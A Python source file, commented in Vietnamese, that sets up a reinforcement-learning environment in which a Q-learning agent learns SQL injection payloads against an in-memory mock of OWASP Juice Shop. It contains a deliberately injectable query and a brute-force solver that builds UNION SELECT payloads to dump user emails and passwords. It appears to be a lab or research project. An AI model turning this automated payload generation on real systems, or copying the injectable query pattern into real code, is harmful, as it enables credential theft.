import sqlite3
import json
import configparser
import sys
import os
import re
import itertools
import logging

# Xử lý import path
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.environment.base_environment import BaseEnvironment
from src.core.action_space import ActionSpace
from src.core.reward_system import RewardSystem
from src.core.state_manager import StateManager

# Import Agent để chạy training ngay trong file này
try:
    from src.agent.q_learning_agent import QLearningAgent
except ImportError:
    # Fallback nếu cấu trúc thư mục khác
    pass

class TrainingEnvironment(BaseEnvironment):
    def __init__(self, config_file):
        config = configparser.ConfigParser()
        config.read(config_file, encoding='utf-8')
        
        # Đọc config, nếu lỗi thì dùng default
        if 'Training' in config:
            train_cfg = config['Training']
            self.success_marker = train_cfg.get('success_marker', 'admin@juice-sh.op')
        else:
            self.success_marker = 'admin@juice-sh.op'
            
        self.error_marker = "SQLITE_ERROR" 
        
        self.action_space = ActionSpace()
        self.state_manager = StateManager()
        
        self.reward_system = RewardSystem(
            normal_count=0,
            success_marker=self.success_marker,
            error_marker=self.error_marker,
            env_type='training'
        )
        
        self.conn = None
        self.cursor = None
        self.current_hidden_col_count = 3 # Mặc định 3 cột ẩn

    def _setup_db(self):
        """Khởi tạo DB SQLite ảo."""
        if self.conn:
            self.conn.close()
        
        self.conn = sqlite3.connect(':memory:')
        self.cursor = self.conn.cursor()
        
        # Tạo bảng Products
        cols = ", ".join([f"c{i} TEXT" for i in range(1, self.current_hidden_col_count + 1)])
        self.cursor.execute(f"CREATE TABLE Products ({cols})")
        
        placeholders = ",".join(["?"] * self.current_hidden_col_count)
        dummy_data = ["dummy_val"] * self.current_hidden_col_count
        self.cursor.execute(f"INSERT INTO Products VALUES ({placeholders})", dummy_data)

        # Tạo bảng Users (Target)
        self.cursor.execute("CREATE TABLE Users (id INTEGER, email TEXT, password TEXT)")
        self.cursor.execute("INSERT INTO Users VALUES (?, ?, ?)", (1, self.success_marker, "123456"))
        
        self.conn.commit()

    def reset(self):
        self._setup_db()
        if hasattr(self.reward_system, 'reset'):
            self.reward_system.reset()
        return self.state_manager.reset_state()

    def step(self, action_index):
        action_string = self.action_space.get_action_string(action_index)
        state_vector = self.state_manager.update_state(action_string, action_index)
        payload = self.state_manager.current_state
        
        full_query = f"SELECT * FROM Products WHERE ((c1 = '{payload}'))"
        
        try:
            self.cursor.execute(full_query)
            rows = self.cursor.fetchall()
            response_text = json.dumps(rows)
            status_code = 200
        except sqlite3.OperationalError as e:
            err_msg = str(e).lower()
            status_code = 500
            response_text = self.error_marker
            if "selects to the left and right of union" in err_msg:
                response_text += "_COLUMN_MISMATCH"
            elif "syntax error" in err_msg:
                response_text += "_SYNTAX_ERROR"
        except Exception:
            status_code = 500
            response_text = "INTERNAL_ERROR"

        response = type('Response', (), {'status_code': status_code, 'text': response_text})
        reward, done = self.reward_system.calculate_reward(response, payload)
        
        return state_vector, reward, done
    
    def get_action_space_size(self):
        return self.action_space.get_action_space_size()

    # --- TÍNH NĂNG TỰ SẮP XẾP (SOLVER) ---
    def brute_force_exploit(self, raw_payload):
        print(f"\n[Env Solver] Đang phân tích payload thô: {raw_payload}")

        match_union = re.search(r"(.*?)UNION", raw_payload, re.IGNORECASE)
        match_from = re.search(r"(FROM.*)", raw_payload, re.IGNORECASE)
        
        prefix = match_union.group(1) + " UNION" if match_union else "a')) UNION"
        suffix = match_from.group(1) if match_from else " FROM Users--" 

        # Lấy các cột AI đã tìm thấy
        detected = [x for x in ["id", "email", "password"] if x.upper() in raw_payload.upper()]
        required = ["id", "email", "password"]
        core_cols = []
        for req in required:
            found = False
            for det in detected:
                if req.upper() in det.upper():
                    core_cols.append(req); found = True; break
            if not found: core_cols.append(req)
            
        print(f"[Env Solver] Cấu trúc: {prefix} ... {suffix}")
        print(f"[Env Solver] Cột cốt lõi: {core_cols}. Đang dò NULL...")

        # Vòng lặp dò tìm
        for num_nulls in range(7):
            col_permutations = list(itertools.permutations(core_cols))
            for p in col_permutations:
                # Thử chèn NULL sau
                items_A = list(p) + ["NULL"] * num_nulls
                payload_A = f"{prefix} SELECT {', '.join(items_A)} {suffix}"
                if self._check_payload(payload_A): return True, payload_A

                # Thử chèn NULL trước
                items_B = ["NULL"] * num_nulls + list(p)
                payload_B = f"{prefix} SELECT {', '.join(items_B)} {suffix}"
                if self._check_payload(payload_B): return True, payload_B
                
                # Thử chèn NULL giữa (nếu ít NULL)
                if 0 < num_nulls <= 2:
                    items_C = list(p)
                    items_C.insert(1, "NULL")
                    if num_nulls == 2: items_C.append("NULL")
                    payload_C = f"{prefix} SELECT {', '.join(items_C)} {suffix}"
                    if self._check_payload(payload_C): return True, payload_C

        return False, None

    def _check_payload(self, payload):
        clean_payload = payload.replace("SELECT SELECT", "SELECT").replace("FROM FROM", "FROM")
        full_query = f"SELECT * FROM Products WHERE ((c1 = '{clean_payload}'))"
        try:
            self.cursor.execute(full_query)
            rows = self.cursor.fetchall()
            return self.success_marker in json.dumps(rows)
        except:
            return False

# =============================================================================
#  CHẠY TRỰC TIẾP TẠI ĐÂY (KHÔNG CẦN TRAIN.PY)
# =============================================================================
if __name__ == "__main__":
    # Cấu hình logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
    
    # 1. Setup
    config_file = 'config/config_training.ini' # Đảm bảo file này tồn tại
    if not os.path.exists(config_file):
        print(f"Lỗi: Không tìm thấy {config_file}. Hãy tạo file config hoặc chỉnh đường dẫn.")
        sys.exit(1)
        
    env = TrainingEnvironment(config_file)
    
    # 2. Setup Agent (Hardcode tham số để khỏi cần đọc config phức tạp)
    print("--- KHỞI TẠO AGENT ---")
    agent = QLearningAgent(
        action_space_size=env.get_action_space_size(),
        lr=0.1, gamma=0.95, epsilon=1.0, epsilon_decay=0.9995, epsilon_min=0.01
    )
    
    # 3. Vòng lặp Training (50,000 Episodes)
    EPISODES = 50000
    print(f"--- BẮT ĐẦU TRAINING {EPISODES} EPISODES ---")
    
    for episode in range(EPISODES):
        state = env.reset()
        done = False
        steps = 0
        
        while not done and steps < 50:
            action = agent.choose_action(state)
            next_state, reward, done = env.step(action)
            agent.learn(state, action, reward, next_state)
            state = next_state
            steps += 1
        
        agent.update_epsilon()
        
        if (episode + 1) % 5000 == 0:
            print(f"Ep {episode + 1}: Epsilon={agent.epsilon:.4f}")

    print("--- TRAINING HOÀN TẤT. CHUYỂN SANG GIAI ĐOẠN KHAI THÁC ---")

    # 4. Giai đoạn Solver (Lấy kết quả)
    agent.epsilon = 0.0 # Tắt random
    state = env.reset()
    raw_payload = ""
    done = False
    step = 0
    
    # Cho chạy 100 bước để lấy full payload
    while not done and step < 100:
        action = agent.choose_action(state)
        action_str = env.action_space.get_action_string(action)
        
        clean_act = action_str.strip()
        if clean_act == "," or action_str.startswith("--") or action_str.startswith(")"):
            raw_payload += clean_act
        else:
            if raw_payload == "" or raw_payload.endswith(" "): raw_payload += action_str
            else: raw_payload += " " + action_str
            
        state, _, done = env.step(action)
        step += 1
        if "FROM" in raw_payload.upper() and "--" in raw_payload: break
    
    # Gọi hàm Solver của Env
    success, final_payload = env.brute_force_exploit(raw_payload)
    
    if success:
        print("\n" + "★"*60)
        print(f"★ BINGO! TÌM THẤY FLAG: {env.success_marker}")
        print(f"★ PAYLOAD CHIẾN THẮNG: {final_payload}")
        print("★"*60 + "\n")
    else:
        print("[-] Rất tiếc, chưa tìm thấy flag. Hãy thử train lại với epsilon decay chậm hơn.")